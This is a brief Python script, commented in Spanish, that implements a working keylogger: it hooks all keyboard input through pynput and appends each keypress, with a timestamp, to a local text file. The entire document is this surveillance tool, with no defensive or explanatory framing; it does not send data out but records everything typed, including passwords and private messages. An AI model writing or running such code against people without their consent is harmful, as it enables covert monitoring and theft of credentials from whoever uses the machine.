from pynput.keyboard import Listener
import datetime

def registrar_tecla(tecla):
    
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') # Para obtener la fecha exacta de la punsacion
    
    try:
        with open('informacion.txt', 'a') as archivo:
              archivo.write(f"[{timestamp}] - {tecla.char}\n")  # Guarda solo el caracter de la tecla presionada
    except AttributeError:
        with open('informacion.txt', 'a') as archivo:
            archivo.write(f"{tecla}\n")  # Guarda teclas especiales como Enter, Shift, etc.

with Listener(on_press=registrar_tecla) as listener:
    listener.join()